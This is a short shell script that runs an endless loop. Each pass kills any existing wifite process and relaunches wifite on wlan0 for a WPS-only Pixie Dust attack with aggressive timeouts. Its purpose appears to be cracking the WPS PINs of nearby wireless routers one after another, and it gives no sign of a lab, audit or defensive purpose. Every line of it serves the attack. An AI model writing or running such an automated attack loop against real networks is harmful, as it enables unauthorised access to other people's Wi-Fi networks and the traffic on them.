#!/bin/sh
while (true)
do
bash kill.sh
killall wifite;
wifite -i wlan0 -p 5 --wps --wps-only --pixie --wps-fails 1 --wps-timeouts 1 --wps-time 15;
done;
